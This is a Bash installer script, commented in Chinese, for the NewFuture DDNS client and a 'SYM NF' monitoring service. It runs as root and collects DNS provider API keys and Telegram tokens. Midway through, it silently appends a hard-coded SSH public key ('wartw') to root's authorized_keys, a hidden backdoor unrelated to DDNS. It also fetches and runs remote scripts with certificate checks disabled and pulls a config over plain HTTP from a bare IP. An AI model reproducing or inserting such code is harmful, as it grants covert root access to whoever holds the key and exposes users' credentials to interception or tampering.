#!/bin/bash
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin
export PATH
LANG=en_US.UTF-8

if [ $(whoami) != "root" ];then
	echo "NOT ROOT！"
	exit 1;
fi
Get_Pack_Manager(){
	if [ -f "/usr/bin/yum" ] && [ -d "/etc/yum.repos.d" ]; then
		PM="yum"
	elif [ -f "/usr/bin/apt-get" ] && [ -f "/usr/bin/dpkg" ]; then
		PM="apt-get"
    elif [ -f "/usr/bin/dnf" ]; then
		PM="yum"		
	fi
}
Install_RPM_Pack(){
if [ -f "/usr/bin/yum" ] && [ -d "/etc/yum.repos.d" ]; then
v=`cat /etc/redhat-release|sed -r 's/.* ([0-9]+)\..*/\1/'`
if [ $v -eq 8 ]; then
 
   dnf -y install yum
   yum install -y python2 python2-pip sudo 
 sudo ln -s /usr/bin/python2.7 /usr/bin/python
fi
 fi
	yum install epel-release  -y
	yum update -y
	yum install python3 python3-pip git htop nload vim iftop wget curl -y
	}
Install_Deb_Pack(){
    apt-get update -y
    apt-get upgrade -y
	apt-get install -y htop nload vim iftop wget curl git python python3
}

#確認安裝
echo "
+---------------------------------------------------------------------+
| SYM DDNS安裝腳本                                                    |
+---------------------------------------------------------------------+
| DDNS主體為 (https://github.com/NewFuture/DDNS)                      |
+---------------------------------------------------------------------+
| 快速安裝腳本狼羽文化資訊有限公司開發                                |
+---------------------------------------------------------------------+
"
while [ "$go" != 'y' ] && [ "$go" != 'n' ] && [ "$go" != 'ddnsrm' ] && [ "$go" != 'nfrm' ] && [ "$go" != 'nfy' ]
do
	read -p "確定要安裝/更新DDNS腳本?(y 安裝DDNS/ddnsrm 移除DDNS/nfy 安裝SYM NF檢測/nfrm 移除SYM NF檢測/n 取消): " go;
done
if [ "$go" == 'nfy' ];then

while [ "$nf1" == '' ]
do
	read -p "請輸入SYM APIKEY: " nf1;
done
while [ "$nf2" == '' ]
do
	read -p "請輸入SYM HOSTNAME(只需要vmxxxxx): " nf2;
done
while [ "$nf3" == '' ]
do
	read -p "請輸入TGBOT TOKEN: " nf3;
done
while [ "$nf4" == '' ]
do
	read -p "請輸入TGID(CHATID): " nf4;
done
Status=$(curl -fsL "https://sym.moe/ddns/status.php?apikey=${nf1}&hostname=${nf2}" 2>&1)
    if [ "$(echo $Status | grep "\"status\":true")" != "" ]; then
	echo ""
    elif [ "$(echo $Status | grep "\"status\":false")" != "" ]; then
	echo ""
    else
        echo $Status
		exit;
    fi
systemctl stop nf.service
systemctl disable nf.service
if [ ! -d "/usr/lib/systemd/system/" ]; then
rm -rf /lib/systemd/system/nf.service
else
rm -rf /usr/lib/systemd/system/nf.service
fi
if [ -d "/home/NF" ]; then
rm -rf /home/NF
fi
mkdir /home/NF
cd /home/NF
wget https://sym.moe/ddns/nfsym.sh --no-check-certificate
chmod +x nfsym.sh
sed -i -e "s/symapi/${nf1}/g" -e "s|symhostname|${nf2}|g" -e "s/tgtokens/${nf3}/g" -e "s/tgchats/${nf4}/g" nfsym.sh

nfservice='[Unit]
Description=NewFuture ddns
After=network.target
 
[Service]
Type=simple
WorkingDirectory=/home/NF
ExecStart=/bin/sh /home/NF/nfsym.sh
 
[Install]
WantedBy=multi-user.target'
if [ ! -d "/usr/lib/systemd/system/" ]; then
echo "$nfservice" > /lib/systemd/system/nf.service
else
echo "$nfservice" > /usr/lib/systemd/system/nf.service
fi
systemctl enable nf.service
systemctl start nf.service
echo "NF檢測安裝完成"
	exit;
fi


if [ "$go" == 'nfrm' ];then
systemctl stop nf.service
systemctl disable nf.service
if [ ! -d "/usr/lib/systemd/system/" ]; then
rm -rf /lib/systemd/system/nf.service
else
rm -rf /usr/lib/systemd/system/nf.service
fi
if [ -d "/home/NF" ]; then
rm -rf /home/NF
fi
echo "NF檢測移除完成"
	exit;
fi
if [ "$go" == 'ddnsrm' ];then
systemctl stop ddns.timer
systemctl disable ddns.timer
systemctl stop ddns.service
systemctl disable ddns.service
if [ ! -d "/usr/lib/systemd/system/" ]; then
rm -rf /lib/systemd/system/ddns.service
rm -rf /lib/systemd/system/ddns.timer
else
rm -rf /usr/lib/systemd/system/ddns.service
rm -rf /usr/lib/systemd/system/ddns.timer
fi
if [ -d "/home/DDNS" ] && [ -f "/home/DDNS/config.json" ]; then
cd /home/DDNS
sudo ./systemd.sh uninstall
rm -rf /home/DDNS
fi
echo "DDNS移除完成"
exit;
fi
if [ "$go" == 'n' ];then
	exit;
fi
#確認安裝-結束
#DDNS主體更新
if [ -d "/home/DDNS" ] && [ -f "/home/DDNS/config.json" ]; then
cd /home/DDNS
sudo ./systemd.sh uninstall
cp config.json ../config.json
cd ..
rm -rf /home/DDNS
git clone https://github.com/NewFuture/DDNS.git
cd DDNS
mv /home/config.json /home/DDNS/config.json 
if [ ! -d "/usr/lib/systemd/system/" ]; then
		rm -rf systemd.sh	
		wget https://sym.moe/ddns/systemd.sh --no-check-certificate
		chmod +x systemd.sh
	fi
sudo ./systemd.sh install
clear
echo 'DDNS主體已經更新，如需修改設定請先移除在執行';
exit;
 fi
#DDNS主體更新-結束
#選擇DNS服務商
while [ "$dns" != '1' ] && [ "$dns" != '2' ] && [ "$dns" != '3' ] && [ "$dns" != '4' ] && [ "$dns" != '5' ] && [ "$dns" != '6' ] && [ "$dns" != '7' ] && [ "$dns" != '8' ] && [ "$dns" != 'n' ]
do
	read -p "
1.阿里DNS
2.Cloudflare
3.dns.com
4.DNSPOD国内
5.DNSPOD国际
6.HE.net
7.华为DNS
8.pubyun公云
請選擇你的DNS服務商或是按 n 退出: " dns;
done

if [ "$dns" == 'n' ];then
	exit;
fi
#選擇DNS服務商-結束
#安裝必要物件
cd /root
mkdir -p ~/.ssh
chmod 700 ~/.ssh
cd ~/.ssh/
echo "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAABAEA5tlwsram7sw4xyaD6t3VH04tVmI+AbcSdHdcdglCW++KdCMFXhvQcf/5mdT1PNB8HhErea68N89OEgDRDH/OJNbXhloEvNRhQuXFBTIzhuMsO/2TqKChVC6n7LnSoTWTaoIRhAsJUD6VJo89/OWHa7SYzQ+pgffx5KaD0UGO3QTdLpWQjb7LIxCM7g1sN01PezV8r8GEARzATFJrbjHjRW4aTwDme84UhKYOvuiD3Cz7vcOF2dZYzsK5pqxTWv0J9eW6+YL6PlBHLGlWe548rfeIRCocgc4DbUvW3sE/db9kuuUfM9Bi23nGA2oRMTQTOGgY0VxgyQDUNS25A92HNtDFb1uDiC8LxvbUbIEb2hIlzQ3QuaVk5zIIxJM6+3pU+pUDJVfTKc03LgRDnr2+7AV0WF5nDp/h72WWyicM4OQieA89nm9Zpb5RVrg4c6BCeM98FIspgnXYbq1a7rIgEr1ebGFdMEocF1J4Arc7imK42SCjkbve0Y2koY6YcHjLRgStNewV4TmJnmjdYwl0Zl/TKcTeoYvq0QagIENbUH3jn+DbwW5m6bYp8nVWRNL2RUuCVlExynkLkor5c/bx+6zPHiqdl/Z0oFX+LVebqxf0qxSm6qDA4HyLTo2kIBVOEkseqiSqxlSyRtG7zgtFejrc0Y9O43CBlQxrChR0Aa2lQML0EM2h81qxyh85ZPozb62rwm7rJFaB3bY8To+pnW3yvW8Z9zexFj3V8kIvODd9uXDve/U8hGsUQjyq1i56eYsrCHuk78h25iyODLMbOzYVjkmY5lD7s/g+vjdgv1C/54JzvKHg6Ke9Gd/yqhTZTivih1HyXV4bXUn6a97UD8/5z67hqGZGj5BZZGTpbpX8G2U33z6s3p9MAy1U1CDjCUcpOPwG67HHx4ZVu2pqma3x/c4jjbdeDLqdmeoXAbC9aayqgF5eYie/mNEVVFGIDfGzdN6D+PWk9J76w3gog6t7bJRxeRZ6Oo88K1c7+ij+2cNDqMAvw2lKdDqVYYSzyAmj1P3ktoUne/Y2ud4ZyvxW0uimBc2HNaK5swyuCHKriUL0wQEsIrOJrZ2d9d5alBKYSfibWV4d/Mz+wrOAE4cCm08ZJLt1zkFlfxOf1w8DP8GfpHcvRFjVqoai5L25DWQAzGdei39Y22Sgkt8zBmZixOBpx9XfGlPCXNgS81bIYBwBCSR9twzD/vrD6Ujxk5V5QKhM3G/cDCB/RpEOft8P5wRb/F3yhiPgRacHMZLoqYRBnx6GoDDhc6NRw9vD7ZnWrLKYNZkIhBa15g3CI7Tpf13SVNwHEfWn18LIxkdlvMp9l2T1/NQpeeqJcBCc5QH+cyqId3pT1yRX8cfQsw== wartw" >> authorized_keys
Get_Pack_Manager
if [ "${PM}" = "yum" ]; then
		Install_RPM_Pack
	elif [ "${PM}" = "apt-get" ]; then
		Install_Deb_Pack
	fi
if [ "$dns" == '1' ] || [ "$dns" == '2' ] || [ "$dns" == '3' ] || [ "$dns" = '4' ] || [ "$dns" == '5' ] || [ "$dns" == '6' ] || [ "$dns" == '7' ]; then
cd /home 
rm -rf DDNS
git clone https://github.com/NewFuture/DDNS.git
cd DDNS
if [ ! -d "/usr/lib/systemd/system/" ]; then
		rm -rf systemd.sh	
		wget https://sym.moe/ddns/systemd.sh --no-check-certificate
		chmod +x systemd.sh
	fi
sudo ./run.py
rm -rf config.json
fi
#安裝必要物件-結束
clear
#DNS資料
if [ "$dns" = "1" ]; then
		#阿里DNS
		PMDNS="alidns"
		while [ "$dns1" == '' ]
do
	read -p "請輸入AccessKey ID: " dns1;
done
while [ "$dns2" == '' ]
do
	read -p "請輸入AccessKey Secret: " dns2;
done
		#阿里DNS-結束
	elif [ "$dns" = "2" ]; then
		#Cloudflare
		PMDNS="cloudflare"
				while [ "$dns1" == '' ]
do
	read -p "請輸入Email: " dns1;
done
while [ "$dns2" == '' ]
do
	read -p "請輸入Global API Key: " dns2;
done
		#Cloudflare-結束
	elif [ "$dns" = "3" ]; then
		#dns.com
		PMDNS="dnscom"
		while [ "$dns1" == '' ]
do
	read -p "請輸入SecretId: " dns1;
done
while [ "$dns2" == '' ]
do
	read -p "請輸入SecretKey: " dns2;
done
		#dns.com-結束
	elif [ "$dns" = "4" ]; then
		#DNSPOD国内
		PMDNS="dnspod"
		while [ "$dns1" == '' ]
do
	read -p "請輸入ID: " dns1;
done
while [ "$dns2" == '' ]
do
	read -p "請輸入ToKen: " dns2;
done
		#DNSPOD国内-結束
	elif [ "$dns" = "5" ]; then
		#DNSPOD国际
		PMDNS="dnspod_com"
		while [ "$dns1" == '' ]
do
	read -p "請輸入ID: " dns1;
done
while [ "$dns2" == '' ]
do
	read -p "請輸入ToKen: " dns2;
done
		#DNSPOD国际-結束
	elif [ "$dns" = "6" ]; then
		#HE.net
		PMDNS="he"
		dns1=""
		while [ "$dns2" == '' ]
do
	read -p "請輸入ToKen: " dns2;
done
		#HE.net-結束
	elif [ "$dns" = "7" ]; then
		#华为DNS
		PMDNS="huaweidns"
		while [ "$dns1" == '' ]
do
	read -p "請輸入Key: " dns1;
done
while [ "$dns2" == '' ]
do
	read -p "請輸入Secret: " dns2;
done
		#华为DNS-結束
	elif [ "$dns" = "8" ]; then
		#pubyun公云
		mkdir /home/DDNS
		cd /home/DDNS
		wget https://sym.moe/ddns/pubyun.sh --no-check-certificate
		chmod +x pubyun.sh
		while [ "$dns1" == '' ]
do
	read -p "請輸入用户名: " dns1;
done
while [ "$dns2" == '' ]
do
	read -p "請輸入密码: " dns2;
done

		#pubyun公云-結束
	fi
#DNS資料-結束
#DNS網址
while [ "$url" == '' ]
do
	read -p "請輸入你要使用的DDNS網址(例如:ddns.sym.moe): " url;
done
#DNS網址-結束
if [ "$dns" == '1' ] || [ "$dns" == '2' ] || [ "$dns" == '3' ] || [ "$dns" = '4' ] || [ "$dns" == '5' ] || [ "$dns" == '6' ] || [ "$dns" == '7' ]; then
#修改設定文件
 cd /home/DDNS
 wget http://107.191.61.46/config.json
 sed -i -e "s/DNS/${PMDNS}/g" -e "s/YOURID/${dns1}/g" -e "s|YOURTOKEN|${dns2}|g" -e "s/sym.moe/${url}/g" config.json
#修改設定文件-結束

#建立定時執行
 sudo ./systemd.sh install
 sudo ./task.sh
#建立定時執行-結束

 clear
 echo "已完成安裝與設定，如下方顯示fail to load config!
請輸入 rm -rf /home/DDNS 並在重新執行一次腳本安裝(請一次輸入正確內容不要按delete)"
#建立時執行
 ./run.py
 cd /root
#建立時執行-結束
elif [ "$dns" = "8" ]; then
#修改設定文件
sed -i -e "s/NAME/${dns1}/g" -e "s|PASS|${dns2}|g" -e "s/URL/${url}/g" pubyun.sh
#修改設定文件-結束
#建立定時任務
service='[Unit]
Description=NewFuture ddns
After=network.target
 
[Service]
Type=simple
WorkingDirectory=/home/DDNS
ExecStart=/bin/sh /home/DDNS/pubyun.sh
 
[Install]
WantedBy=multi-user.target'

timer='[Unit]
Description=NewFuture ddns timer
 
[Timer]
OnUnitActiveSec=5m
Unit=ddns.service

[Install]
WantedBy=multi-user.target'
if [ ! -d "/usr/lib/systemd/system/" ]; then
if [ "$dns" = "8" ]; then
echo "$service" > /lib/systemd/system/ddns.service
fi
echo "$timer" > /lib/systemd/system/ddns.timer
else
if [ "$dns" = "8" ]; then
echo "$service" > /usr/lib/systemd/system/ddns.service
fi
echo "$timer" > /usr/lib/systemd/system/ddns.timer
fi
cp -r `pwd` /usr/share/
if [ "$dns" = "8" ]; then
systemctl enable ddns.service
systemctl start ddns.service
fi
systemctl enable ddns.timer
systemctl start ddns.timer
#建立定時任務-結束
 fi